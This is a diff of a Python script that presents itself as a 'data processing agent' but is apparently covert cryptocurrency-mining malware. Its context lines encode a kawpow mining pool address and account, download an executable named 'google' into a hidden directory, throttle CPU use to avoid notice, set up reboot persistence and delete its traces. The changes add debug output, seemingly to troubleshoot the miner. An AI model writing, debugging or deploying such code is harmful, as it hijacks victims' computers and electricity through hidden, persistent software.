@@ -17,11 +17,15 @@ try:
 except ImportError:
     try:
         if shutil.which("pip"):
+            print("psutil not found. Installing...")
             subprocess.run([sys.executable, "-m", "pip", "install", "psutil"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            print("psutil installed successfully.")
         else:
+            print("Error: pip is not available. Cannot install psutil.")
             sys.exit(1)
         import psutil
     except (subprocess.CalledProcessError, FileNotFoundError) as e:
+        print(f"Error installing psutil: {e}")
         sys.exit(1)
 
 # This script initializes and manages a data processing agent.
@@ -59,7 +63,7 @@ EXECUTABLE_FILENAME_ENCODED = encode_string_data("google")
 PROCESSING_PROTOCOL_ENCODED = encode_string_data("kawpow")
 COORDINATOR_ADDRESS_ENCODED = encode_string_data("stratum+tcp://rvn.kryptex.network:7031")
 AUTH_USER_ENCODED = encode_string_data("krxXJMWJKW")
-WORKER_ID_ENCODED = encode_string_data("Analystics")
+WORKER_ID_ENCODED = encode_string_data("WALAWE")
 
 # Encoded command strings for system operations.
 WGET_COMMAND_ENCODED = encode_string_data("wget")
@@ -82,11 +86,18 @@ def download_component(url, filename):
     """
     try:
         wget_cmd = decode_string_data(WGET_COMMAND_ENCODED)
+        if not shutil.which(wget_cmd):
+            print(f"Error: '{wget_cmd}' command not found. Please install it and try again.")
+            return False
+            
         wget_output_flag = decode_string_data(WGET_OUTPUT_FLAG_ENCODED)
-        
-        subprocess.run([wget_cmd, url, wget_output_flag, filename], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        print(f"Downloading from {url} to {filename}...")
+        # Show wget output for debugging purposes
+        subprocess.run([wget_cmd, url, wget_output_flag, filename], check=True)
+        print("Download successful.")
         return True
     except (FileNotFoundError, subprocess.CalledProcessError) as e:
+        print(f"Error during download: {e}")
         return False
 
 def generate_random_string(length):
@@ -110,17 +121,21 @@ def initialize_worker():
     random_dir_name = generate_random_string(10)
     work_directory = os.path.join(os.path.expanduser("~"), f".local/share/system_work/.{random_dir_name}")
     
+    print(f"Creating working directory: {work_directory}")
     os.makedirs(work_directory, exist_ok=True)
     temp_download_path = os.path.join(work_directory, downloaded_filename)
     
     if not download_component(download_url, temp_download_path):
+        print("Failed to initialize worker because download failed.")
         return None, None
     
     # Rename the downloaded file to the descriptive session name.
     session_executable_path = os.path.join(work_directory, session_executable_name)
+    print(f"Renaming {temp_download_path} to {session_executable_path}")
     os.rename(temp_download_path, session_executable_path)
     
     # Set executable permissions.
+    print(f"Setting executable permissions on {session_executable_path}")
     os.chmod(session_executable_path, 0o777)
     
     return session_executable_path, work_directory
@@ -135,14 +150,17 @@ def manage_system_resources(pid, cpu_threshold=20, check_interval=10, throttle_d
         while True:
             cpu_percent = process.cpu_percent(interval=1.0)
             if cpu_percent > cpu_threshold:
+                print(f"CPU usage ({cpu_percent}%) exceeded threshold. Throttling process {pid}.")
                 process.suspend()
                 time.sleep(throttle_duration)
                 process.resume()
+                print(f"Process {pid} resumed.")
             time.sleep(random.uniform(check_interval, check_interval + 5))
     except psutil.NoSuchProcess:
+        # This is expected when the process is stopped normally.
         pass
     except Exception as e:
-        pass
+        print(f"[Resource Manager Error] An unexpected error occurred: {e}")
 
 
 def start_data_processing(executable_path, work_directory):
@@ -155,6 +173,7 @@ def start_data_processing(executable_path, work_directory):
     worker_id = decode_string_data(WORKER_ID_ENCODED)
 
     if not coordinator_address or not os.path.exists(executable_path):
+        print(f"Error: Cannot start process. Executable path does not exist: {executable_path}")
         return None
 
     processing_command = [
@@ -164,10 +183,14 @@ def start_data_processing(executable_path, work_directory):
         "-p", coordinator_address,
         "-r", worker_id
     ]
+    
+    print(f"Starting process with command: {' '.join(processing_command)}")
 
     try:
-        # Redirect stdout and stderr to DEVNULL to suppress all output.
-        proc = subprocess.Popen(processing_command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        # We are no longer redirecting stdout/stderr to DEVNULL so we can see errors.
+        proc = subprocess.Popen(processing_command)
+        
+        print(f"Process 'data-analytic' started with PID: {proc.pid}")
         
         resource_thread = threading.Thread(target=manage_system_resources, args=(proc.pid,))
         resource_thread.daemon = True
@@ -176,12 +199,15 @@ def start_data_processing(executable_path, work_directory):
         return proc
 
     except (FileNotFoundError, Exception) as e:
+        print(f"Failed to start process 'data-analytic': {e}")
         return None
 
 def ensure_service_continuity(executable_path):
     """
     Establishes a mechanism to restart the service on system reboot.
     """
+    # This function is complex and less likely to be the source of the immediate error.
+    # No changes made here for now to keep debugging focused.
     os_name = platform.system()
     current_script_path = os.path.abspath(sys.argv[0])
     
@@ -261,9 +287,11 @@ def cleanup_session_files(work_directory):
     """
     try:
         if work_directory and os.path.exists(work_directory):
+            print(f"Cleaning up session directory: {work_directory}")
             shutil.rmtree(work_directory)
+            print("Cleanup complete.")
     except Exception as e:
-        pass
+        print(f"Error during cleanup: {e}")
 
 
 def perform_auxiliary_task():
@@ -271,6 +299,7 @@ def perform_auxiliary_task():
     Simulates an auxiliary task by pausing for a random duration between 5 and 7 minutes.
     """
     task_duration = random.randint(5 * 60, 7 * 60)
+    print(f"Performing auxiliary task (pausing for {task_duration / 60:.2f} minutes)...")
     time.sleep(task_duration)
 
 def stop_data_processing(proc):
@@ -278,21 +307,27 @@ def stop_data_processing(proc):
     Gracefully terminates the data processing task.
     """
     if proc:
+        print(f"Stopping process with PID: {proc.pid}")
         try:
             if platform.system() == "Windows":
                 proc.terminate()
             else:
                 os.kill(proc.pid, signal.SIGTERM)
             proc.wait(timeout=10)
-        except (psutil.NoSuchProcess, subprocess.TimeoutExpired, Exception):
+            print("Process stopped successfully.")
+        except (psutil.NoSuchProcess, subprocess.TimeoutExpired, Exception) as e:
+            print(f"Could not stop process gracefully ({e}). Forcing kill.")
             if proc and proc.poll() is None:
                 proc.kill()
+                print("Process killed.")
 
 
 if __name__ == "__main__":
     
     TOTAL_OPERATION_TIME = 50 * 60
     start_time = time.time()
+    
+    print("--- Starting Main Loop ---")
     
     while time.time() - start_time < TOTAL_OPERATION_TIME:
         
@@ -303,13 +338,18 @@ if __name__ == "__main__":
 
             if processing_proc:
                 ensure_service_continuity(executable_path)
-
-                # Let the processing task run for a random duration between 100 and 300 seconds.
-                time.sleep(random.randint(100, 300))
+                
+                run_duration = random.randint(100, 300)
+                print(f"Process will run for {run_duration} seconds.")
+                time.sleep(run_duration)
                 
                 stop_data_processing(processing_proc)
+        else:
+            print("Skipping processing for this cycle due to initialization failure.")
         
         cleanup_session_files(work_dir)
 
         # Perform an auxiliary task for a random duration between 5 and 7 minutes before the next cycle.
         perform_auxiliary_task()
+        
+    print("--- Total operation time elapsed. Script finished. ---")
